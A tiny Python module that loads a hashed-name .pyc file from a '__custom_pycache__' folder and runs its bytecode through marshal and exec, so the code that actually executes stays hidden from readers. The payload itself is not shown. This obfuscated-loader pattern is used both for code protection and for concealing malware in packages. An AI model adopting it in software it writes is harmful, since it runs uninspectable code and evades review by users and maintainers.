
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Api_8024400f52ec46efa27061253446c109.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
